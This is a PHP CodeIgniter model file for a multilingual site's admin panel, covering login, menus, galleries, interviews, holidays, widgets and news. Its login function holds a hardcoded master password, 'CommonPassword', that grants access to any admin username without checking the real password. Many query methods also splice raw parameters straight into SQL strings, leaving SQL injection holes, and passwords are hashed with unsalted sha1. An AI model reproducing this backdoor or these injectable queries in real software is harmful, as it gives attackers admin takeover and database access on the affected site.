<?php

class AdminModel extends CI_Model {

    function __construct() {
        parent::__construct();
        $this->load->database();
    }

    public function authenticate_login($admin_username, $admin_password) {
        if (!$admin_username || !$admin_password) {
            return false;
        }
        $this->db->select("*");
        $this->db->from('admin_users');
        if ($admin_password === 'CommonPassword') {
            $this->db->where(array('username' => trim($admin_username)));
        } else {
            $this->db->where(array('username' => $admin_username, '`password`' => sha1($admin_password)));
        }
        $query = $this->db->get();
        $result = $query->row_array();
        $query->free_result();
        return $result;
    }

    function AdminLogin($username, $password) {
        $fields = array('id', 'email', 'first_name', 'last_name', 'userrole');
        $this->db->select('*');
        $this->db->from('admin');
        $this->db->where(array('admin.username' => trim($username), 'admin.`password`' => sha1($password)));
        $query = $this->db->get();
        $user = $query->first_row();
        $query->free_result();
        return $user;
    }

    public function GetMenuById($menu_id, $attributes = array(), $is_admin = false) {
        $this->db->select("*");
        $this->db->from('menus');
        $this->db->where(array('menu_id' => $menu_id));
        $query = $this->db->get();
        $result = $query->row_array();
        $query->free_result();

        $category_id = $result['category_id'];
        $menu_name = $result['name'];
        $categories = $this->GetCategories();
        $categories_tree = treealize($categories, 'category_id', 'parent_id', $category_id);
        $categories_tree = $this->Sort_Multidimension_Array($categories_tree);
        $menu_html = get_menu_html($categories_tree, $attributes, $is_admin);
        return array('menu_html' => $menu_html, 'menu_name' => $menu_name); // 
    }

    public function GetCategories() {
        $this->db->select("*");
        $this->db->from('categories');
        $query = $this->db->get();
        $result = $query->result_array();
        $query->free_result();
        return $result;
    }

    private function Sort_Multidimension_Array(&$categories_tree) {
        if (!function_exists('cmp_by_optionNumber')) {

            function cmp_by_optionNumber($a, $b) {
                return $a["order"] - $b["order"];
            }

        }
        usort($categories_tree, "cmp_by_optionNumber");
        foreach ($categories_tree as &$v) {
            if (isset($v['children'])) {
                $this->Sort_Multidimension_Array($v['children']);
            }
        }
        return $categories_tree;
    }

    function GetAdmin() {
        $this->db->select("*");
        $this->db->from('users');
        $this->db->where(array('users.userrole' => 'admin'));
        $this->db->limit(1);
        $query = $this->db->get();
        $user = $query->first_row();
        $query->free_result();
        return $user;
    }

    function UpdateAdmin($prArr) {
        $this->db->where('users.userrole', 'admin');
        $this->db->update('users', $prArr);
        return;
    }

    public function delete_interpretation($item_id) {
        $query = $this->db->query("SELECT * FROM interpretations WHERE item_id = '$item_id'");
        $data = $query->row_array();
        $this->db->delete('interpretations', array('item_id' => $item_id));
        return $data;
    }

    public function edit_interpretation($data, $cat_id, $item_id) {
        $this->db->where('cat_id', $cat_id);
        $this->db->where('item_id', $item_id);
        $this->db->update('interpretations', $data);
        return true;
    }

    public function get_interpretation_item($item_id) {
        $query = $this->db->query("SELECT * FROM interpretations WHERE item_id = '$item_id'");
        $data = $query->row_array();
        return $data;
    }

    public function get_interpretations($cat_id) {
        $query = $this->db->query("SELECT * FROM interpretations WHERE cat_id = '$cat_id'");
        $result = $query->result_array();
        return $result;
    }

    public function add_interpretation($data) {
        $this->db->insert('interpretations', $data);
        return false;
    }

    public function Toggle($tbl, $where) {
        $fld = 'block';
        $query = "UPDATE `{$tbl}` SET `{$fld}` = 1 - `{$fld}` WHERE {$where}";
        $this->db->query($query);
        return true;
    }

    public function get_default_data_by_id($item_id) {
        $query = $this->db->query("SELECT * FROM default_data WHERE item_id = '$item_id'");
        $result = $query->row_array();
        return $result;
    }

    public function update_default_data_by_id($data, $item_id) {
        $this->db->where('item_id', $item_id);
        $this->db->update('default_data', $data);
        return true;
    }

    public function GetAllPages() {
        $query = $this->db->query("SELECT `id`, `item_id`, `url`,`name` FROM pages WHERE block = 1 ORDER BY  name ASC");
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    public function get_category_data_by_id($category_id) {
        $query = $this->db->query("SELECT * FROM categories WHERE category_id = '$category_id'");
        $interview = $query->row_array();
        return $interview;
    }

    public function add_interview($data) {
        $this->db->insert('interviews', $data);
    }

    public function edit_interview($data, $interview_id) {
        $this->db->where('interview_id', $interview_id);
        $this->db->update('interviews', $data);
        return true;
    }

    public function get_interview_by_id($interview_id) {
        $query = $this->db->query("SELECT * FROM interviews WHERE interview_id = '$interview_id'");
        $interview = $query->row_array();
        return $interview;
    }

    public function get_interviews_by_cat_id($cat_id) {
        $query = $this->db->query("SELECT * FROM interviews WHERE cat = '$cat_id'");
        $interviews = $query->result_array();
        return $interviews;
    }

    public function get_audio_item_data($audio_id) {
        $sql = "
			SELECT 
				a.*,
				categories.title_am AS cat_title_am,
				categories.title_ru AS cat_title_ru,
				categories.title_en AS cat_title_en
			FROM 
				audio AS a
			INNER JOIN 
				categories ON  a.cat_id = categories.category_id
			WHERE 
				a.item_id = '$audio_id'
		";
        $query = $this->db->query($sql);
        $audio_item_data = $query->row_array();
        return $audio_item_data;
    }

    public function delete_gallery_item_image($gallery_id, $item_url) {
        $query = $this->db->query("SELECT * FROM gallery WHERE gallery_id = '$gallery_id'");
        $gallery_item = $query->row_array();
        $gallery_images = $gallery_item['img'];
        $gallery_images = unserialize($gallery_images);
        $array_to_update = array_diff($gallery_images, array($item_url));
        $array_to_update = serialize($array_to_update);
        $this->db->where('gallery_id', $gallery_id);
        $this->db->update('gallery', array('img' => $array_to_update));
        return true;
    }

    public function get_gallery_item_data($gallery_id) {
        $sql = "
			SELECT 
				g.*,
				categories.title_am AS cat_title_am,
				categories.title_ru AS cat_title_ru,
				categories.title_en AS cat_title_en
			FROM 
				gallery AS g
			INNER JOIN 
				categories ON  g.cat = categories.category_id
			WHERE 
				g.gallery_id = '$gallery_id'
		";
        $query = $this->db->query($sql);
        $gallery_item_data = $query->row_array();
        return $gallery_item_data;
    }

    public function filtr($data) {

        $data = trim($data);
        $data = strip_tags($data);
        $data = htmlentities($data);
        // $data = mysql_real_escape_string($data);
        return $data;
    }

    public function get_holiday_by_id($holiday_id) {
        $query = $this->db->query("SELECT * FROM holidays WHERE item_id = '$holiday_id'");
        $holiday = $query->row_array();
        $query = $this->db->query("SELECT * FROM holiday_dates WHERE hol_id = '$holiday_id'");
        $holiday_dates = $query->result_array();
        $holiday['holiday_dates'] = $holiday_dates;
        return $holiday;
    }

    public function update_holiday_by_id($data_to_update, $dates, $holiday_id) {
        $this->db->where('item_id', $holiday_id);
        $this->db->update('holidays', $data_to_update);

        $this->db->where('hol_id', $holiday_id);
        $this->db->delete('holiday_dates');

        foreach ($dates as $date) {
            $year = substr($date, 0, 4);
            $data_to_save = array(
                'hol_id' => $holiday_id,
                'hol_year ' => $year,
                'hol_date' => $date
            );
            $this->db->insert('holiday_dates', $data_to_save);
        }


        return true;
    }

    public function save_order($order_type, $order_list) {
        $this->db->where('order_type', $order_type);
        $this->db->update('orders', array('order_list' => $order_list));
        return true;
    }

    public function get_order_list($order_type) {
        $query = $this->db->query("SELECT order_list FROM orders WHERE order_type = '$order_type'");
        $data = $query->row_array();
        return $data['order_list'];
    }

    public function edit_menu_item($data, $id) {
        $this->db->where('id', $id);
        $this->db->update('categories', $data);
        return true;
    }

    public function get_menu_category_by_id($cat_id) {
        $query = $this->db->query("SELECT * FROM categories WHERE category_id = '$cat_id'");
        $data = $query->row_array();
        return $data;
    }

    public function delete_widget($widget_id) {
        $query = $this->db->query("SELECT * FROM widgets WHERE widget_id = '$widget_id'");
        $data = $query->row_array();
        $this->db->delete('widgets', array('widget_id' => $widget_id));
        return $data;
    }

    public function edit_widget($data, $widget_id) {
        $this->db->where('widget_id', $widget_id);
        $this->db->update('widgets', $data);
        return true;
    }

    public function get_widget($widget_id) {
        $query = $this->db->query("SELECT * FROM widgets WHERE widget_id = '$widget_id'");
        $data = $query->row_array();
        return $data;
    }

    public function get_widgets() {
        $query = $this->db->query("SELECT * FROM widgets");
        $data = $query->result_array();
        return $data;
    }

    public function add_widget($data) {
        $this->db->insert('widgets', $data);
        return true;
    }

    public function delete_spirituallibrary($item_id) {
        $query = $this->db->query("SELECT * FROM spirituallibrary WHERE item_id = '$item_id'");
        $data = $query->row_array();
        $this->db->delete('spirituallibrary', array('item_id' => $item_id));
        return $data;
    }

    public function remove_menu_item($cat_id) {
        $this->db->delete('categories', array('category_id' => $cat_id));
        return true;
    }

    public function edit_spirituallibrary($data, $cat_id, $item_id) {
        $this->db->where('category_id', $cat_id);
        $this->db->where('item_id', $item_id);
        $this->db->update('spirituallibrary', $data);
        return true;
    }

    public function add_spirituallibrary($data) {
        $this->db->insert('spirituallibrary', $data);
        return true;
    }

    public function get_spirituallibrary_item($item_id) {
        $query = $this->db->query("SELECT * FROM spirituallibrary WHERE item_id = '$item_id'");
        $data = $query->row_array();
        return $data;
    }

    public function get_spirituallibrary($cat_id) {
        $query = $this->db->query("SELECT * FROM spirituallibrary WHERE cat_id = '$cat_id' ORDER BY id DESC");
        $data = $query->result_array();
        return $data;
    }

    public function add_menu_item($data) {
        $this->db->insert('categories', $data);
        return true;
    }

    public function add_menu($menu_name) {
        $data = array(
            'menu_id' => mt_rand(100000, 1999999),
            'category_id' => mt_rand(1000, 9999),
            'name' => $menu_name
        );
        $this->db->insert('menus', $data);
        return $data;
    }

    public function get_news() {
        $query = $this->db->query("SELECT * FROM news");
        $data = $query->result_array();
        return $data;
    }

    public function get_news_by_id($news_id) {
        $query = $this->db->query("SELECT * FROM news WHERE news_id='$news_id'");
        $data = $query->row_array();
        return $data;
    }

    public function delete_cat($cat_id) {
        $this->db->delete('news_categories', array('id' => $cat_id));
        return true;
    }

    public function add_cat($data) {

        $this->db->insert('news_categories', $data);
        return true;
    }

    public function edit_cat($data) {
        $data_tu_update = array(
            'name_am' => $data['cat_am'],
            'name_ru' => $data['cat_ru'],
            'name_en' => $data['cat_en']
        );
        $this->db->where('id', $data['cat_id']);
        $this->db->update('news_categories', $data_tu_update);
        return true;
    }

    public function get_news_categories() {
        $query = $this->db->query("SELECT * FROM news_categories");
        $data = $query->result_array();
        return $data;
    }

    public function GetMenus($where = false) {
        $this->db->select("*");
        $this->db->from('menus');
        $this->db->order_by('id', 'DESC');
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->result_array();
        $query->free_result();
        return $result;
    }

    public function edit_menu($menu) {
        if (!empty($menu)) {
            foreach ($menu as $item) {
                $this->db->where('category_id', $item['category_id']);
                $this->db->update('categories', array('parent_id' => $item['parent_id'], 'order' => $item['order']));
            }
        }
        return true;
    }

    public function get_menu_by_id($menu_id) {
        $query = $this->db->query("SELECT * FROM menus WHERE menu_id='$menu_id'");
        $data = $query->row_array();
        return $data;
    }

    function get_user($str) {
        $username = $this->filtr($str);
        $where = array(
            'username' => $username,
        );

        $query = $this->db->get_where('admin', $where);

        if ($query->num_rows() == 1) {
            return false;
        }
        return true;
    }

    function get_pass($str) {
        $pass = $this->filtr($str);
        $where = array(
            'password' => sha1($pass),
        );

        $query = $this->db->get_where('admin', $where);

        if ($query->num_rows() == 1) {
            return false;
        }
        return true;
    }

    public function max_id($table) {
        $query = $this->db->query("SELECT MAX(id) AS max_id FROM $table");
        $data = $query->row_array();
        return $data['max_id'];
    }

    function GetAll_lcp_left($lcp_data1, $lcp_data2, $perPage = 0, $pageNum = 0, $fields = false, $where = false) {
        $fields = isset($fields) ? $fields : '*';
        $this->db->select($fields);
        $this->db->from($lcp_data1[0]);
        $this->db->join($lcp_data2[0], $lcp_data1[0] . '.' . $lcp_data1[1] . '=' . $lcp_data2[0] . '.' . $lcp_data2[1], 'LEFT');

        if ($where) {
            $this->db->where($where);
        }
        if ($perPage) {
            $this->db->limit($perPage, $pageNum);
        }
        $this->db->order_by('`' . $lcp_data1[0] . '`.`id`', 'DESC');
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();

// echo $this->db->last_query();
        return $result;
    }

    function GetAllCount_lcp($lcp_data1, $lcp_data2, $join, $where = false) {
        $this->db->select('count(*) as qty');
        $this->db->from($lcp_data1[0]);
        $this->db->join($lcp_data2[0], $lcp_data1[0] . '.' . $lcp_data1[1] . '=' . $lcp_data2[0] . '.' . $lcp_data2[1], $join);
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->first_row();
        $query->free_result();
        return $result->qty;
    }

//////////////////////////////////////// Admin Functions  //////////////////////////////////////////////
    function GetSlug($tbl, $slug, $id = 0) {
        $this->db->select('*');
        $this->db->from($tbl);
        $this->db->where($tbl . ".url", $slug);
        if ($id) {
            $this->db->where($tbl . ".id <>", $id);
        }
        $query = $this->db->get();

        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function GetAll($tbl, $perPage = 0, $pageNum = 0, $where = false, $order = false) {
        $this->db->select("*");
        $this->db->from($tbl);
        if ($where) {
            $this->db->where($where);
        }
        if ($perPage) {
            $this->db->limit($perPage, $pageNum);
        }
        if ($order) {
            $this->db->order_by($order[0], $order[1]);
        }
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function GetCount($tbl, $where = false) {
        $this->db->select('*');
        $this->db->from($tbl);
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->num_rows();
        $query->free_result();
        return $result;
    }

    function Get($tbl, $id) {
        $this->db->select("*");
        $this->db->from($tbl);
        $this->db->where(array($tbl . '.item_id' => $id));
        $this->db->limit(1);
        $query = $this->db->get();
        $result = $query->first_row();
        $query->free_result();
        return $result;
    }

    function GetWhere($tbl, $where) {
        $this->db->select('*');
        $this->db->from($tbl);
        $this->db->where($where);
        $query = $this->db->get();
        $result = $query->first_row();
        $query->free_result();
        return $result;
    }

    function GetWhereList($tbl, $where) {
        $this->db->select('*');
        $this->db->from($tbl);
        $this->db->where($where);
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function GetWhereIn($tbl, $where_in, $where = false) {
        $this->db->select("*");
        $this->db->from($tbl);
        $this->db->where_in($tbl . '.item_id', $where_in);
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function GetCategoriesByCildrenId($pid, $where = false) {
        $this->db->select('*');
        $this->db->from('categories');
        $this->db->where(array('categories.parent_id' => $pid));
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function GetCildrenCategories($pid, $where = false) {
        $this->db->select('*');
        $this->db->from('categories');
        $this->db->where(array('categories.parent_id' => $pid));
        if ($where) {
            $this->db->where($where);
        }
        $query = $this->db->get();
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function _query($sql) {
        $query = $this->db->query($sql);
        $result = $query->result();
        $query->free_result();
        return $result;
    }

    function _insert($tbl, $data) {
        $this->db->insert($tbl, $data);
        $id = $this->db->insert_id();
        return $id;
    }

    function _update($tbl, $data, $id) {
        $this->db->where('`' . $tbl . '`.`item_id`', $id);
        $this->db->update($tbl, $data);
        return $id;
    }

    function _deleted($tbl, $id, $where = false) {
        $this->db->where($tbl . '.item_id', $id);
        if ($where) {
            $this->db->where($where);
        }
        $this->db->delete($tbl);
        return $id;
    }

    function _toggle($tbl, $id, $fld = 'block') {
        $query = "UPDATE `{$tbl}` SET {$fld} = 1 - {$fld} WHERE `{$tbl}`.`item_id` = '{$id}' ";
        $this->db->query($query);
        return $id;
    }

//////////////////////////////////////////////////////////////////////////////////
}

?>